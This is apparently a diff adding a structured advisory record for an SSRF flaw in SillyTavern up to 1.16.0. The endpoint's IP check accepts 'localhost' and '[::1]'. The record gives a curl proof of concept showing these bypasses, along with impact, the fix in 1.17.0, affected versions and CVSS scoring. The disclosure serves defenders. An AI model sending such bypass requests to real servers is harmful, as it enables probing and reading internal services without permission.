@@ -1,0 +1,167 @@
+advisory_id: GHSA-wm7j-m6jm-8797
+datasource_id: github_osv/GHSA-wm7j-m6jm-8797
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-wm7j-m6jm-8797/GHSA-wm7j-m6jm-8797.json
+aliases:
+  - CVE-2026-34526
+summary: |
+  SillyTavern: Incomplete IP validation in /api/search/visit allows SSRF via localhost and IPv6
+  ### Details
+  Distinct from CVE-2025-59159 and CVE-2026-26286 (all fixed in v1.16.0). This endpoint is still unpatched.
+
+  In `src/endpoints/search.js` line 419, the hostname is checked against `/^\d+\.\d+\.\d+\.\d+$/`. This only matches literal dotted-quad IPv4 (e.g. `127.0.0.1`, `10.0.0.1`). It does not catch:
+  - `localhost` (hostname, not dotted-quad)
+  - `[::1]` (IPv6 loopback)
+  - DNS names resolving to internal addresses (e.g. `localtest.me` -> 127.0.0.1)
+
+  A separate port check (`urlObj.port !== ''`) limits exploitation to services on default ports (80/443), making this lower severity than a fully unrestricted SSRF.
+
+  ### PoC
+  1. Start SillyTavern v1.16.0 normally
+  2. Send requests to compare blocked vs bypassed (requires a valid session cookie or CSRF disabled):
+  ```bash
+  # Blocked — dotted-quad matched by regex
+  curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8000/api/search/visit \
+    -H "Content-Type: application/json" \
+    -d '{"url": "http://127.0.0.1/", "html": true}'
+  # Returns: 400 (blocked)
+
+  # Bypassed — "localhost" is not dotted-quad
+  curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8000/api/search/visit \
+    -H "Content-Type: application/json" \
+    -d '{"url": "http://localhost/", "html": true}'
+  # Returns: 500 (passed validation, fetch attempted, ECONNREFUSED because nothing on port 80)
+
+  # Bypassed — IPv6 loopback is not dotted-quad
+  curl -s -o /dev/null -w "%{http_code}" -X POST http://127.0.0.1:8000/api/search/visit \
+    -H "Content-Type: application/json" \
+    -d '{"url": "http://[::1]/", "html": true}'
+  # Returns: 500 (passed validation, fetch attempted)
+  ```
+
+  The 400 vs 500 difference confirms `localhost` and `[::1]` pass the IP check. The 500 is ECONNREFUSED (nothing listening on port 80), not a validation rejection.
+
+  ### Impact
+  Server-side request forgery with partial restrictions. An authenticated user can force the server to fetch from internal hosts on default ports (80/443) using hostnames or IPv6 addresses that bypass the IP check. The full response body is returned. Lower severity than a fully unrestricted SSRF due to the port limitation.
+
+  ## Resolution
+
+  The issue was addressed in version 1.17.0 by improving IPv6 address validation
+impacted_packages:
+  - purl: pkg:npm/sillytavern
+    affected_versions: vers:npm/<=1.16.0
+    fixed_versions: vers:npm/1.17.0
+    affected_packages:
+      - pkg:npm/sillytavern@1.4.1
+      - pkg:npm/sillytavern@1.4.2
+      - pkg:npm/sillytavern@1.4.3
+      - pkg:npm/sillytavern@1.4.4
+      - pkg:npm/sillytavern@1.4.5
+      - pkg:npm/sillytavern@1.4.6
+      - pkg:npm/sillytavern@1.4.7
+      - pkg:npm/sillytavern@1.4.8
+      - pkg:npm/sillytavern@1.4.9
+      - pkg:npm/sillytavern@1.5.0
+      - pkg:npm/sillytavern@1.5.1
+      - pkg:npm/sillytavern@1.5.3
+      - pkg:npm/sillytavern@1.5.4
+      - pkg:npm/sillytavern@1.5.5
+      - pkg:npm/sillytavern@1.6.0
+      - pkg:npm/sillytavern@1.6.1
+      - pkg:npm/sillytavern@1.6.2
+      - pkg:npm/sillytavern@1.6.4
+      - pkg:npm/sillytavern@1.6.5
+      - pkg:npm/sillytavern@1.6.6
+      - pkg:npm/sillytavern@1.6.7
+      - pkg:npm/sillytavern@1.6.8
+      - pkg:npm/sillytavern@1.7.0
+      - pkg:npm/sillytavern@1.7.1
+      - pkg:npm/sillytavern@1.7.2
+      - pkg:npm/sillytavern@1.7.3
+      - pkg:npm/sillytavern@1.8.0
+      - pkg:npm/sillytavern@1.8.1
+      - pkg:npm/sillytavern@1.8.2
+      - pkg:npm/sillytavern@1.8.3
+      - pkg:npm/sillytavern@1.8.4
+      - pkg:npm/sillytavern@1.9.0
+      - pkg:npm/sillytavern@1.9.1
+      - pkg:npm/sillytavern@1.9.2
+      - pkg:npm/sillytavern@1.9.3
+      - pkg:npm/sillytavern@1.9.4
+      - pkg:npm/sillytavern@1.9.5
+      - pkg:npm/sillytavern@1.9.6
+      - pkg:npm/sillytavern@1.9.7
+      - pkg:npm/sillytavern@1.10.0
+      - pkg:npm/sillytavern@1.10.1
+      - pkg:npm/sillytavern@1.10.2
+      - pkg:npm/sillytavern@1.10.3
+      - pkg:npm/sillytavern@1.10.4
+      - pkg:npm/sillytavern@1.10.5
+      - pkg:npm/sillytavern@1.10.6
+      - pkg:npm/sillytavern@1.10.7
+      - pkg:npm/sillytavern@1.10.8
+      - pkg:npm/sillytavern@1.10.9
+      - pkg:npm/sillytavern@1.10.10
+      - pkg:npm/sillytavern@1.11.0
+      - pkg:npm/sillytavern@1.11.1
+      - pkg:npm/sillytavern@1.11.2
+      - pkg:npm/sillytavern@1.11.3
+      - pkg:npm/sillytavern@1.11.4
+      - pkg:npm/sillytavern@1.11.5
+      - pkg:npm/sillytavern@1.11.6
+      - pkg:npm/sillytavern@1.11.7
+      - pkg:npm/sillytavern@1.11.8
+      - pkg:npm/sillytavern@1.12.0-preview
+      - pkg:npm/sillytavern@1.12.0
+      - pkg:npm/sillytavern@1.12.1
+      - pkg:npm/sillytavern@1.12.2
+      - pkg:npm/sillytavern@1.12.3
+      - pkg:npm/sillytavern@1.12.4
+      - pkg:npm/sillytavern@1.12.5
+      - pkg:npm/sillytavern@1.12.6
+      - pkg:npm/sillytavern@1.12.7
+      - pkg:npm/sillytavern@1.12.8
+      - pkg:npm/sillytavern@1.12.9
+      - pkg:npm/sillytavern@1.12.10
+      - pkg:npm/sillytavern@1.12.11
+      - pkg:npm/sillytavern@1.12.12
+      - pkg:npm/sillytavern@1.12.13
+      - pkg:npm/sillytavern@1.12.14
+      - pkg:npm/sillytavern@1.13.0
+      - pkg:npm/sillytavern@1.13.1
+      - pkg:npm/sillytavern@1.13.2
+      - pkg:npm/sillytavern@1.13.3
+      - pkg:npm/sillytavern@1.13.4
+      - pkg:npm/sillytavern@1.13.5
+      - pkg:npm/sillytavern@1.14.0
+      - pkg:npm/sillytavern@1.16.0
+    fixed_packages:
+      - pkg:npm/sillytavern@1.17.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-wm7j-m6jm-8797/GHSA-wm7j-m6jm-8797.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/SillyTavern/SillyTavern
+    reference_type:
+    reference_id:
+  - url: https://github.com/SillyTavern/SillyTavern/releases/tag/1.17.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-34526
+    reference_type:
+    reference_id: CVE-2026-34526
+  - url: https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-wm7j-m6jm-8797
+    reference_type:
+    reference_id: GHSA-wm7j-m6jm-8797
+exploits: []
